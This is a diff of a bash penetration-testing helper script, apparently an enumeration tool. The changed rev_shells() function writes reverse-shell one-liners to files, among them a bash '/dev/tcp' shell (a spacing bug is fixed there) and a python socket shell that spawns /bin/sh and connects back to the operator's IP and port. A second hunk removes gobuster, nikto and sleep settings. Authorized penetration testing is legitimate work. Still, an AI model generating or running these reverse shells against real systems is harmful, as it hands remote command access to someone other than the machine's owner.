@@ -729,7 +729,7 @@ rev_shells()
 	echo -e $txtblu$txtbld"[i] Generating some simple reverse-shell one-liners using $local_ip, port $shell_port, see: file://$custom_path$client_name/generated_shells/"$txtrst
 	$sleeps
 	echo -e $txtgry" -  Adding bash reverse shell"$txtrst
-	echo -e "bash -i >& /dev/tcp/$local_ip/ $shell_port 0>&1" > $custom_path$client_name/generated_shells/bash_reverse_tcp.txt
+	echo -e "bash -i >& /dev/tcp/$local_ip/$shell_port 0>&1" > $custom_path$client_name/generated_shells/bash_reverse_tcp.txt
 	$sleeps
 	echo -e $txtgry" -  Adding python reverse shell"$txtrst
 	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$local_ip\"$shell_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $custom_path$client_name/generated_shells/python_reverse_tcp.txt
@@ -886,10 +886,6 @@ givemeallyougot()
 		continue_quit
 	fi
 }
-
-gobuster_threads="-t 20" # default: -t 10
-nikto_timeout="-timeout 5" # Adjust depending on network speed, if fast: "-timeout 1", slow: "-timeout 10"
-sleeps="sleep 0.1" # default: sleep 0.1 # I like sleeps!
 
 screenshot_save() # Set default screenshot save directory
 {
